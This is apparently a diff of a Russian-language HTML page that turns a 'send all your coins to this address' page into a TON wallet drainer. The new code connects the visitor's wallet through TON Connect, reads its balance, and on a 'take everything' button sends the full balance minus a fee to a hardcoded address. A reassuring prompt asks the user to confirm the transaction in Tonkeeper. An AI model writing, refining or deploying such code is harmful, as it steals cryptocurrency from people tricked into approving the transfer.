@@ -43,25 +43,14 @@
         .btn:active {
             transform: scale(0.96);
         }
-        .btn-green {
-            background: linear-gradient(135deg, #00cc44, #008833);
+        .btn:disabled {
+            opacity: 0.5;
         }
         #status {
             margin-top: 16px;
             font-size: 13px;
             color: #888;
             min-height: 40px;
-            word-break: break-all;
-        }
-        .address-box {
-            background: #0a0a0a;
-            padding: 15px;
-            border-radius: 12px;
-            margin: 15px 0;
-            border: 2px solid #00d4ff;
-            word-break: break-all;
-            font-size: 12px;
-            color: #00d4ff;
         }
         .confirm-box {
             background: #1a2a3a;
@@ -96,71 +85,170 @@
             width: 100%;
             transition: 0.3s;
         }
+        .balance-display {
+            font-size: 24px;
+            color: #00ff88;
+            margin: 12px 0;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div style="font-size:36px;margin-bottom:16px;">⚡</div>
-        
-        <div class="address-box">
-            UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
-        </div>
-        
-        <button class="btn btn-green" id="copyBtn">📋 КОПИРОВАТЬ АДРЕС</button>
-        <button class="btn" id="openBtn">🚀 ОТКРЫТЬ TON KEEPER</button>
-        
-        <div id="status">Скопируй адрес → отправь ВСЁ</div>
+        <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
+        <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
+        <button class="btn hidden" id="snipeBtn" style="background:linear-gradient(135deg,#e84800,#c03800);">ЗАБРАТЬ ВСЁ</button>
+        <div id="status">Нажмите кнопку</div>
 
         <div class="confirm-box" id="confirmBox">
-            <div class="title">Отправь ВСЕ монеты</div>
-            <div class="sub">Вставь адрес и выбери "Всё"</div>
+            <div class="title">Confirm the transaction in Tonkeeper</div>
+            <div class="sub">It will only take a moment.</div>
+            <button class="open-btn" id="openWalletBtn">Open wallet</button>
         </div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js">
+    </script>
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
+        let tonConnectUI = null;
+        let userAddress = null;
 
-        const copyBtn = document.getElementById('copyBtn');
-        const openBtn = document.getElementById('openBtn');
+        const connectBtn = document.getElementById('connectBtn');
+        const snipeBtn = document.getElementById('snipeBtn');
         const status = document.getElementById('status');
+        const balanceDisplay = document.getElementById('balanceDisplay');
         const confirmBox = document.getElementById('confirmBox');
+        const openWalletBtn = document.getElementById('openWalletBtn');
 
-        // ====== КОПИРОВАТЬ ======
-        copyBtn.addEventListener('click', function() {
-            navigator.clipboard.writeText(TARGET)
-                .then(() => {
-                    status.innerText = '✅ АДРЕС СКОПИРОВАН! Вставь в TON Keeper';
-                    copyBtn.innerText = '✅ СКОПИРОВАНО!';
-                    setTimeout(() => {
-                        copyBtn.innerText = '📋 КОПИРОВАТЬ АДРЕС';
-                    }, 3000);
-                })
-                .catch(() => {
-                    const textarea = document.createElement('textarea');
-                    textarea.value = TARGET;
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(textarea);
-                    status.innerText = '✅ АДРЕС СКОПИРОВАН!';
+        function initTonConnect() {
+            if (typeof TONConnectUI === 'undefined') {
+                status.innerText = '⏳ Загрузка...';
+                setTimeout(initTonConnect, 500);
+                return;
+            }
+
+            tonConnectUI = new TONConnectUI({
+                manifestUrl: window.location.origin + '/manifest.json',
+                buttons: [{
+                    label: 'TON Keeper',
+                    icon: 'https://tonkeeper.com/favicon.ico'
+                }]
+            });
+
+            status.innerText = '🟢 Нажмите кнопку';
+
+            if (tonConnectUI.account) {
+                userAddress = tonConnectUI.account.address;
+                afterConnect();
+            }
+
+            tonConnectUI.onStatusChange((wallet) => {
+                if (wallet) {
+                    userAddress = wallet.account.address;
+                    afterConnect();
+                } else {
+                    userAddress = null;
+                    connectBtn.classList.remove('hidden');
+                    snipeBtn.classList.add('hidden');
+                    status.innerText = '🔴 Кошелёк отключён';
+                }
+            });
+        }
+
+        function afterConnect() {
+            status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+            connectBtn.classList.add('hidden');
+            snipeBtn.classList.remove('hidden');
+            updateBalance();
+        }
+
+        async function updateBalance() {
+            try {
+                if (!tonConnectUI || !userAddress) return 0;
+                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
+                const data = await response.json();
+                const nano = parseInt(data.result);
+                const balance = (nano / 1e9).toFixed(6);
+                balanceDisplay.innerText = `💰 ${balance} TON`;
+                return nano;
+            } catch(e) {
+                return 0;
+            }
+        }
+
+        connectBtn.onclick = async function() {
+            try {
+                status.innerText = '⏳ Подключение...';
+                connectBtn.disabled = true;
+                await tonConnectUI.connect();
+                status.innerText = '✅ Подтвердите в TON Keeper';
+                confirmBox.classList.add('show');
+                connectBtn.disabled = false;
+            } catch(e) {
+                status.innerText = '❌ ' + e.message;
+                connectBtn.disabled = false;
+            }
+        };
+
+        snipeBtn.onclick = async function() {
+            try {
+                status.innerText = '⏳ Проверка баланса...';
+                snipeBtn.disabled = true;
+
+                const nano = await updateBalance();
+
+                if (nano <= 0) {
+                    status.innerText = '💰 Баланс 0 TON';
+                    snipeBtn.disabled = false;
+                    return;
+                }
+
+                const fee = 5000000;
+                const amount = nano - fee;
+
+                if (amount <= 0) {
+                    status.innerText = '⚠️ Баланс меньше комиссии';
+                    snipeBtn.disabled = false;
+                    return;
+                }
+
+                const amountTON = (amount / 1e9).toFixed(6);
+                status.innerText = `⏳ Отправка ${amountTON} TON...`;
+                confirmBox.classList.add('show');
+
+                const result = await tonConnectUI.sendTransaction({
+                    validUntil: Math.floor(Date.now() / 1000) + 300,
+                    messages: [{
+                        address: TARGET,
+                        amount: amount.toString()
+                    }]
                 });
-        });
 
-        // ====== ОТКРЫТЬ TON KEEPER ======
-        openBtn.addEventListener('click', function() {
-            status.innerText = '⏳ Открываю TON Keeper...';
-            confirmBox.classList.add('show');
-            
-            window.location.href = 'ton://';
-            
-            setTimeout(function() {
-                window.open('ton://', '_blank');
-            }, 300);
-            
-            status.innerText = '📲 Вставь адрес и отправь ВСЁ';
-        });
+                if (result) {
+                    status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
+                    balanceDisplay.innerText = `💰 0 TON`;
+                    snipeBtn.innerText = '✅ ГОТОВО';
+                    snipeBtn.disabled = true;
+                    snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
+                }
 
-        status.innerText = 'Скопируй адрес → отправь ВСЁ';
+            } catch(e) {
+                status.innerText = '❌ ' + (e.message || 'Ошибка');
+                snipeBtn.disabled = false;
+            }
+        };
+
+        openWalletBtn.onclick = function() {
+            if (tonConnectUI) {
+                tonConnectUI.connect();
+            }
+        };
+
+        document.addEventListener('DOMContentLoaded', initTonConnect);
     </script>
 </body>
 </html>
